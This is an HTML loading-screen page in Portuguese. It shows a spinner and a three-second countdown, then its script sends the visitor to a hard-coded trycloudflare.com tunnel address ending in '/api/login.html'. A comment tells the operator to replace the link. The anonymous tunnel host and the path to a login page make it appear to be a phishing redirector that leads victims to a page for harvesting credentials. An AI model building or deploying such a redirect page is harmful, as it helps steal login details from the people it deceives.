<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carregando...</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}
.spinner { animation: spin 1s linear infinite; }
.pulse-text { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
.gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
.glass {
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.2);
}
</style>
</head>
<body class="gradient-bg">
  <div class="min-h-screen w-full flex items-center justify-center p-4">
    <div class="glass rounded-3xl shadow-2xl p-8 sm:p-12 max-w-md w-full">
      <div class="flex flex-col items-center justify-center space-y-6">
        
        <!-- Spinner -->
        <div class="relative w-20 h-20 sm:w-24 sm:h-24">
          <div class="absolute inset-0 rounded-full border-4 border-white/20"></div>
          <div class="spinner absolute inset-0 rounded-full border-4 border-transparent border-t-white border-r-white"></div>
        </div>
        
        <div class="text-center space-y-3">
          <h1 class="text-3xl sm:text-4xl font-bold text-white pulse-text">
            Carregando...
          </h1>
          <p class="text-white/80 text-sm sm:text-base" id="countdown">
            Aguarde 3s...
          </p>
        </div>

        <!-- Barra de progresso -->
        <div class="w-full bg-white/20 rounded-full h-2 overflow-hidden">
          <div id="progress" class="h-full bg-white rounded-full transition-all duration-1000 ease-linear" style="width: 0%"></div>
        </div>

      </div>
    </div>
  </div>

  <script>
    // TROCA ESSE LINK AQUI PELO LINK QUE VAI ABRIR DEPOIS DO LOADING
    const LINK_DESTINO = ' https://happiness-opponent-maximize-twins.trycloudflare.com/ICI/storage/LibrasFera/api/login.html';
    const TEMPO_LOADING = 3000; // 3000ms = 3 segundos
    
    let segundos = TEMPO_LOADING / 1000;
    const countdown = document.getElementById('countdown');
    const progress = document.getElementById('progress');
    
    // Anima a barra
    setTimeout(() => {
      progress.style.width = '100%';
    }, 100);
    
    // Contagem regressiva
    const intervalo = setInterval(() => {
      segundos--;
      if (segundos > 0) {
        countdown.textContent = `Aguarde ${segundos}s...`;
      } else {
        countdown.textContent = 'Redirecionando...';
        clearInterval(intervalo);
      }
    }, 1000);
    
    // Redireciona depois do tempo
    setTimeout(() => {
      window.location.href = LINK_DESTINO;
    }, TEMPO_LOADING);
  </script>
</body>
</html>
